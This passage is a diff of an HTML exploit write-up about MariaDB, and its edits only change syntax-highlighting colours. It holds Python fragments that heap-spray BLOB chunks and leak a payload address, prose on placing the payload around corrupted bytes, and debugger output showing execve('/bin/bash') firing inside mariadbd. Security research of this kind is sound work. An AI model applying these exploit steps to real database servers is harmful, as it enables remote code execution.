 </span><span style="color:#6e7781;">   10   </span><span style="color:#0550ae;">│</span><span style="color:#6e7781;">---│</span><span style="color:#1f2328;">
 </span><span style="color:#6e7781;">    9   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   </span><span style="color:#0550ae;">print</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">'[!] spraying blob-sized chunks (this might take a while...)'</span><span style="color:#0550ae;">)</span><span style="color:#1f2328;">
-</span><span style="color:#6e7781;">    8   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   </span><span style="color:#6639ba;">for</span><span style="color:#1f2328;"> i </span><span style="color:#0550ae;">in</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">range</span><span style="color:#0550ae;">(</span><span style="color:#ff966c;">0x200</span><span style="color:#0550ae;">)</span><span style="color:#0550ae;">:</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">    8   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   </span><span style="color:#6639ba;">for</span><span style="color:#1f2328;"> i </span><span style="color:#0550ae;">in</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">range</span><span style="color:#0550ae;">(</span><span style="color:#0550ae;">0x200</span><span style="color:#0550ae;">)</span><span style="color:#0550ae;">:</span><span style="color:#1f2328;">
 </span><span style="color:#6e7781;">    7   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   </span><span style="color:#6e7781;">│</span><span style="color:#1f2328;">   cy</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">execute</span><span style="color:#0550ae;">(</span><span style="color:#6639ba;">spray_blob_chunks</span><span style="color:#0550ae;">())</span><span style="color:#1f2328;">
 </span><span style="color:#6e7781;">    6   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   </span><span style="color:#6e7781;">│</span><span style="color:#1f2328;">
 </span><span style="color:#6e7781;">    5   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   </span><span style="color:#6e7781;">│</span><span style="color:#1f2328;">
 </span><span style="color:#6e7781;">    4   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   </span><span style="color:#0550ae;">input</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">'[!] leaking payload'</span><span style="color:#0550ae;">)</span><span style="color:#1f2328;">
 </span><span style="color:#6e7781;">    3   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   cy</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">execute</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">&quot;SELECT ST_Area(a) FROM lk WHERE b IS NOT NULL AND c IS NOT NULL&quot;</span><span style="color:#0550ae;">)</span><span style="color:#1f2328;">
 </span><span style="color:#6e7781;">    2   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   r </span><span style="color:#0550ae;">=</span><span style="color:#1f2328;"> cy</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">fetchone</span><span style="color:#0550ae;">()</span><span style="color:#1f2328;">
-</span><span style="color:#6e7781;">    1   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   payload_address </span><span style="color:#0550ae;">=</span><span style="color:#1f2328;"> </span><span style="color:#6639ba;">_recover</span><span style="color:#0550ae;">(</span><span style="color:#1f2328;">r</span><span style="color:#0550ae;">[</span><span style="color:#ff966c;">0</span><span style="color:#0550ae;">])</span><span style="color:#1f2328;"></span></code></pre>
+</span><span style="color:#6e7781;">    1   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   payload_address </span><span style="color:#0550ae;">=</span><span style="color:#1f2328;"> </span><span style="color:#6639ba;">_recover</span><span style="color:#0550ae;">(</span><span style="color:#1f2328;">r</span><span style="color:#0550ae;">[</span><span style="color:#0550ae;">0</span><span style="color:#0550ae;">])</span><span style="color:#1f2328;"></span></code></pre>
 
       <p>This leaks our BLOB entry as intended. A small caveat --- due to the nature of these BLOB entries as dynamically allocated buffers on the heap, it seems that at some point in time, this chunk will invariably get freed and whatever payload we write in it will become corrupted. This, thankfully, is only a little bit annoying, because the chunk gets reclaimed by other, smaller chunks and is not overwritten in its entirety. The payload data does get corrupted, but only slightly, and the bytes that get corrupted are (to my eye) deterministic. We can simply place the payload in a patchwork fashion, by strategically placing it in the bytes that do not get corrupted.</p>
 
@@ -397,31 +397,31 @@ recovered 94218643904184 0x55b0fccd16b8
       <p>Below is a view of the <span class='monospace'>execve()</span> invocation firing.</p>
 
       <pre><code><span style="color:#0550ae;">[+]</span> Detected syscall (arch:X86, mode:64)
-    <span style="color:olive;">execve(const char __user* filename, const char __user* const __user* argv, const char __user* const __user* envp)</span>
+    <span style="color:#6639ba;">execve(const char __user* filename, const char __user* const __user* argv, const char __user* const __user* envp)</span>
     <span style="color:#0550ae;">Parameter            Register             Value</span>
     RET                  $rax                 -
     NR                   $rax                 0x3b
-    filename             $rdi                 <span style="color:#6639ba;">0x000077afef322c08</span>  -&gt;  0x7361622f6e69622f <span style="color:olive;">'/bin/bash'</span>
-    argv                 $rsi                 <span style="color:#6639ba;">0x000077afd6e4ee6b</span>  -&gt;  <span style="color:#6639ba;">0x000077afef322c08</span>  -&gt;  0x7361622f6e69622f <span style="color:olive;">'/bin/bash'</span>
+    filename             $rdi                 <span style="color:#6639ba;">0x000077afef322c08</span>  -&gt;  0x7361622f6e69622f <span style="color:#6639ba;">'/bin/bash'</span>
+    argv                 $rsi                 <span style="color:#6639ba;">0x000077afd6e4ee6b</span>  -&gt;  <span style="color:#6639ba;">0x000077afef322c08</span>  -&gt;  0x7361622f6e69622f <span style="color:#6639ba;">'/bin/bash'</span>
     envp                 $rdx                 0x0000000000000000
 <span style="color:#0550ae;">--------------------------------------------------------------------------------------------------------------------------------------------------------------- threads (shown
 :4 / all:14) ----
-</span>[ <span style="color:#6639ba;">Thread Id:1, tid:1</span>] Name: &quot;mariadbd&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#cf222e;">0x7fb039aa6a82</span> &lt;NO_SYMBOL&gt;, reason: <span style="color:#6639ba;">SINGLE STEP</span>
-[ <span style="color:#6639ba;">Thread Id:2, tid:145</span>] Name: &quot;mariadbd&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#cf222e;">0x7fb039aa6a82</span> &lt;NO_SYMBOL&gt;, reason: <span style="color:#6639ba;">SINGLE STEP</span>
-[ <span style="color:#6639ba;">Thread Id:3, tid:144</span>] Name: &quot;signal_handler&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#cf222e;">0x7fb039aa6a82</span> &lt;NO_SYMBOL&gt;, reason: <span style="color:#6639ba;">SINGLE STEP</span>
-[*<span style="color:#6639ba;">Thread Id:12, tid:158</span>] Name: &quot;one_connection&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#cf222e;">0x55bee19e2f3a</span> &lt;NO_SYMBOL&gt;, reason: <span style="color:#6639ba;">SINGLE STEP</span>
+</span>[ <span style="color:#6639ba;">Thread Id:1, tid:1</span>] Name: &quot;mariadbd&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#0550ae;">0x7fb039aa6a82</span> &lt;NO_SYMBOL&gt;, reason: <span style="color:#6639ba;">SINGLE STEP</span>
+[ <span style="color:#6639ba;">Thread Id:2, tid:145</span>] Name: &quot;mariadbd&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#0550ae;">0x7fb039aa6a82</span> &lt;NO_SYMBOL&gt;, reason: <span style="color:#6639ba;">SINGLE STEP</span>
+[ <span style="color:#6639ba;">Thread Id:3, tid:144</span>] Name: &quot;signal_handler&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#0550ae;">0x7fb039aa6a82</span> &lt;NO_SYMBOL&gt;, reason: <span style="color:#6639ba;">SINGLE STEP</span>
+[*<span style="color:#6639ba;">Thread Id:12, tid:158</span>] Name: &quot;one_connection&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#0550ae;">0x55bee19e2f3a</span> &lt;NO_SYMBOL&gt;, reason: <span style="color:#6639ba;">SINGLE STEP</span>
 <span style="color:#0550ae;">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ------ trace ----
-</span>[*<span style="color:#6639ba;">#0</span>] <span style="color:#cf222e;">0x55bee19e2f3a</span> &lt;NO_SYMBOL&gt;
-[ <span style="color:#6639ba;">#1</span>] <span style="color:#cf222e;">0x55bee1be0eab</span> &lt;sp_cursor::fetch(THD*, Virtual_tmp_table*, List&lt;sp_fetch_target&gt;*, bool)+0xbb&gt;
-[ <span style="color:#6639ba;">#2</span>] <span style="color:#cf222e;">0x55bee1edf766</span> &lt;sp_instr_cfetch_by_ref::execute(THD*, unsigned int*)+0x66&gt;
-[ <span style="color:#6639ba;">#3</span>] <span style="color:#cf222e;">0x55bee1bda7d2</span> &lt;sp_head::execute(THD*, bool)+0x9f2&gt;
-[ <span style="color:#6639ba;">#4</span>] <span style="color:#cf222e;">0x55bee1bdc133</span> &lt;sp_head::execute_procedure(THD*, List&lt;Item&gt;*)+0xa83&gt;
-[ <span style="color:#6639ba;">#5</span>] <span style="color:#cf222e;">0x55bee1ca0667</span> &lt;NO_SYMBOL&gt;
-[ <span style="color:#6639ba;">#6</span>] <span style="color:#cf222e;">0x55bee1cb4b97</span> &lt;mysql_execute_command(THD*, bool)+0x3887&gt;
-[ <span style="color:#6639ba;">#7</span>] <span style="color:#cf222e;">0x55bee1cb7599</span> &lt;mysql_parse(THD*, char*, unsigned int, Parser_state*)+0x1c9&gt;
-[ <span style="color:#6639ba;">#8</span>] <span style="color:#cf222e;">0x55bee1ca3f57</span> &lt;dispatch_command(enum_server_command, THD*, char*, unsigned int, bool)+0x16b7&gt;
-[ <span style="color:#6639ba;">#9</span>] <span style="color:#cf222e;">0x55bee1ca5c17</span> &lt;do_command(THD*, bool)+0x1e7&gt;</code></pre>
+</span>[*<span style="color:#6639ba;">#0</span>] <span style="color:#0550ae;">0x55bee19e2f3a</span> &lt;NO_SYMBOL&gt;
+[ <span style="color:#6639ba;">#1</span>] <span style="color:#0550ae;">0x55bee1be0eab</span> &lt;sp_cursor::fetch(THD*, Virtual_tmp_table*, List&lt;sp_fetch_target&gt;*, bool)+0xbb&gt;
+[ <span style="color:#6639ba;">#2</span>] <span style="color:#0550ae;">0x55bee1edf766</span> &lt;sp_instr_cfetch_by_ref::execute(THD*, unsigned int*)+0x66&gt;
+[ <span style="color:#6639ba;">#3</span>] <span style="color:#0550ae;">0x55bee1bda7d2</span> &lt;sp_head::execute(THD*, bool)+0x9f2&gt;
+[ <span style="color:#6639ba;">#4</span>] <span style="color:#0550ae;">0x55bee1bdc133</span> &lt;sp_head::execute_procedure(THD*, List&lt;Item&gt;*)+0xa83&gt;
+[ <span style="color:#6639ba;">#5</span>] <span style="color:#0550ae;">0x55bee1ca0667</span> &lt;NO_SYMBOL&gt;
+[ <span style="color:#6639ba;">#6</span>] <span style="color:#0550ae;">0x55bee1cb4b97</span> &lt;mysql_execute_command(THD*, bool)+0x3887&gt;
+[ <span style="color:#6639ba;">#7</span>] <span style="color:#0550ae;">0x55bee1cb7599</span> &lt;mysql_parse(THD*, char*, unsigned int, Parser_state*)+0x1c9&gt;
+[ <span style="color:#6639ba;">#8</span>] <span style="color:#0550ae;">0x55bee1ca3f57</span> &lt;dispatch_command(enum_server_command, THD*, char*, unsigned int, bool)+0x16b7&gt;
+[ <span style="color:#6639ba;">#9</span>] <span style="color:#0550ae;">0x55bee1ca5c17</span> &lt;do_command(THD*, bool)+0x1e7&gt;</code></pre>
 
       <p>With that our work is done.</p>
 
